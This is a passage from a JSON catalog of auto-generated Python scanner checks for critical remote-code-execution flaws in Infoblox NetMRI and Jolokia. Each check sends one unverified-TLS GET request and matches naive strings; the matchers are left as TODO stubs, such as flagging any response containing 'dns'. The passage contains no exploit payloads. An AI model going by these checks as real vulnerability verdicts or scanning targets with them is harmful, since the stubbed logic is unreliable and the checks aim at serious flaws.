req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(interactsh_protocol, 'dns'); status_code == 500\"\n\n        # Simple word matcher simulation\n        matchers = ['dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_infoblox_netmri_rails_cookie_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "infoblox",
          "netmri",
          "rails",
          "rce",
          "deserialization",
          "oast",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_jolokia_acceslogvalve_rce",
        "name": "Jolokia write to RCE valve",
        "language": "Python",
        "famille": "WebApp",
        "description": "RCE in Jolokia < 1.7.1 using AccesLogValve",
        "severity": "critical",
        "detection": "[AND] status HTTP [200] | mot(s) '\"host=localhost,name=AccessLogValve,type=Valve\"'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-acceslogvalve-rce\nName: Jolokia write to RCE valve\nSeverity: critical\nDescription: RCE in Jolokia < 1.7.1 using AccesLogValve\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_acceslogvalve_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-acceslogvalve-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia write to RCE valve\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"host=localhost,name=AccessLogValve,type=Valve\"\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"host=localhost,name=AccessLogValve,type=Valve\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia write to RCE valve\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_acceslogvalve_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-acceslogvalve-rce\nName: Jolokia write to RCE valve\nSeverity: critical\nDescription: RCE in Jolokia < 1.7.1 using AccesLogValve\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_acceslogvalve_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-acceslogvalve-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia write to RCE valve\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"host=localhost,name=AccessLogValve,type=Valve\"\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"host=localhost,name=AccessLogValve,type=Valve\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia write to RCE valve\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_acceslogvalve_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "jolokia",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_jolokia_createstandardhost_rce",
        "name": "Jolokia file write to RCE jfr",
        "language": "Python",
        "famille": "WebApp",
        "description": "File read and file write to RCE by deploying a vhost with MBeanFactory/createStandardHost and DiagnosticCommand/jfrStart",
        "severity": "critical",
        "detection": "[AND] status HTTP [200] | mot(s) '\"desc\":\"Create a new StandardHost\", \"desc\":\"Array of Diagnostic Commands Arguments and Options\"'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-createstandardhost-rce\nName: Jolokia file write to RCE jfr\nSeverity: critical\nDescription: File read and file write to RCE by deploying a vhost with MBeanFactory/createStandardHost and DiagnosticCommand/jfrStart\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_createstandardhost_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-createstandardhost-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia file write to RCE jfr\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"desc\":\"Create a new StandardHost\", \"desc\":\"Array of Diagnostic Commands Arguments and Options\"\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"desc\":\"Create a new StandardHost\", \"desc\":\"Array of Diagnostic Commands Arguments and Options\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia file write to RCE jfr\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_createstandardhost_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-createstandardhost-rce\nName: Jolokia file write to RCE jfr\nSeverity: critical\nDescription: File read and file write to RCE by deploying a vhost with MBeanFactory/createStandardHost and DiagnosticCommand/jfrStart\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_createstandardhost_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-createstandardhost-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia file write to RCE jfr\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] status HTTP [200] | mot(s) \\'\"desc\":\"Create a new StandardHost\", \"desc\":\"Array of Diagnostic Commands Arguments and Options\"\\''\n\n        # Simple word matcher simulation\n        matchers = ['\"desc\":\"Create a new StandardHost\", \"desc\":\"Array of Diagnostic Commands Arguments and Options\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jolokia file write to RCE jfr\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jolokia_createstandardhost_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "jolokia",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_jolokia_tomcat_creds_leak",
        "name": "Jolokia <= 1.7.1 Information Leakage",
        "language": "Python",
        "famille": "Exposure",
        "description": "Tomcat's credential disclosure leading to Remote Code Execution via WAR upload.",
        "severity": "critical",
        "detection": "[AND] status HTTP [200] | mot(s) '\"mbean\":\"Users:database=UserDatabase,type=UserDatabase\", \"users\":' | mot(s) '\"users\":[]'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jolokia-tomcat-creds-leak\nName: Jolokia <= 1.7.1 Information Leakage\nSeverity: critical\nDescription: Tomcat's credential disclosure leading to Remote Code Execution via WAR upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jolokia_tomcat_creds_leak:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jolokia-tomcat-creds-leak\"\n    SEVERITY = \"critical\"\n    NAME = \"Jolokia <= 1.7.1 Information Leakage\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        